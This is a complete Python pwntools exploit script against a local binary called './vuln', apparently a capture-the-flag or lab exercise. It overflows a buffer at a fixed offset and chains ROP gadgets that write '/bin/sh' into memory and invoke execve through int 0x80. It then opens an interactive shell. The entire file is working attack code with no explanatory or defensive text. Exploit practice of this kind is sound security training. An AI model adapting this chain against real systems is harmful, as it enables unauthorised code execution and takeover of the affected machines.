#!/usr/bin/python3
from pwn import process, p32

shell = process("./vuln")

offset = 28
junk = b"A" * offset

command = b"/bin/sh\x00"

payload  = b""
payload += junk

for i in range(0, len(command), 4):
    payload += p32(0x80b074a)     # pop eax; ret;
    payload += p32(0x80e5060 + i) # .data
    payload += p32(0x806ca36)     # xchg edx, eax; ret;
    payload += p32(0x80b074a)     # pop eax; ret;
    payload += command[i:i+4]     # string to write
    payload += p32(0x8059102)     # mov dword ptr [edx], eax; ret;

payload += p32(0x80583fa) # pop ebx; ret;
payload += p32(0x80e5060) # "/bin/sh"
payload += p32(0x80b074a) # pop eax; ret;
payload += p32(0x0)       # NULL
payload += p32(0x806ca36) # xchg edx, eax; ret;
payload += p32(0x80b074a) # pop eax; ret;
payload += p32(0xb)       # NULL
payload += p32(0x804a74f) # xor ecx, ecx; int 0x80;

shell.sendlineafter(b"!\n", payload)
shell.interactive()
